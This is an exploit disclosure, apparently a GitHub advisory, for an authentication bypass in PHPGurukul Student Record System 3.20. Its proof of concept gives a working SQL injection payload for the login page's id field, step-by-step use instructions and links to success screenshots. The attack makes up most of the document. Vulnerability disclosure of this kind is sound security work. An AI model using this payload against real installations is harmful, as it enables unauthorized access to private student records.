# Student Record System - Authentication Bypass
+ **Exploit Title:** Student Record System - Authentication Bypass
+ **Date:** 2024-01-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/student-record-system-php/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7216
+ **Version:** 3.20
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Student Record System 3.20 allows Authentication Bypass via the `id` and `password` parameters at "http://localhost/studentrecordms/login.php". 

## Proof of Concept:
+ Go to this address: "http://localhost/studentrecordms/login.php"
+ id : `'or 1=1-- -` password : `1`  and log in
+ Authentication Bypass Successful !

![Student Record auth bypass 1](https://github.com/BurakSevben/CVEs/assets/117217689/9c1055c1-e608-4599-825d-6565b6c9c76f)


![studenr recot auth bypass success](https://github.com/BurakSevben/CVEs/assets/117217689/2d28097f-ee2a-4554-b708-3741283d9c39)
